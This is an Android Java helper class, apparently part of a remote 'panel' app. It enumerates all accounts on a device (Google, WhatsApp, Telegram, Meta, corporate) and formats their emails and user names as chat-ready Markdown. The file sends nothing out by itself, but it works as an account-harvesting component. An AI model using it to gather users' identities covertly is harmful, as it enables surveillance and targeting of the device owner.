package com.java.panel;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;

public class AccountHelper {
    public static String getAccounts(Context context) {
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                return "❌ GET_ACCOUNTS permission is required to read accounts.";
            }

            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();

            if (accounts == null || accounts.length == 0) {
                return "📭 No registered accounts found on the device.";
            }

            StringBuilder sb = new StringBuilder("╭───『 👤 Device Accounts 』───╮\n\n");
            sb.append("Total Accounts: ").append(accounts.length).append("\n\n");

            for (int i = 0; i < accounts.length; i++) {
                Account acc = accounts[i];
                String icon = "🔑";
                String typeDesc = acc.type;
                String lowerType = acc.type.toLowerCase();

                // Assign smart icon and label based on account type
                if (lowerType.contains("google")) {
                    icon = "🌐";
                    typeDesc = "Google Account";
                } else if (lowerType.contains("whatsapp")) {
                    icon = "💬";
                    typeDesc = "WhatsApp";
                } else if (lowerType.contains("telegram")) {
                    icon = "✈️";
                    typeDesc = "Telegram";
                } else if (lowerType.contains("facebook") || lowerType.contains("meta")) {
                    icon = "📘";
                    typeDesc = "Meta / Facebook";
                } else if (lowerType.contains("exchange") || lowerType.contains("corp") || lowerType.contains("work")) {
                    icon = "💼";
                    typeDesc = "Corporate / Exchange";
                } else if (lowerType.contains("twitter") || lowerType.contains("x.com")) {
                    icon = "🐦";
                    typeDesc = "X (Twitter)";
                }

                sb.append("  ").append(icon).append(" **").append(typeDesc).append("**\n");
                sb.append("    └ **User/Email:** `").append(acc.name).append("`\n");
                sb.append("    └ **Type Package:** `").append(acc.type).append("`\n\n");
            }

            sb.append("╰─────────────────────────────╯");
            return sb.toString();
        } catch (Exception e) {
            return "❌ Error while fetching accounts: " + e.getMessage();
        }
    }
}
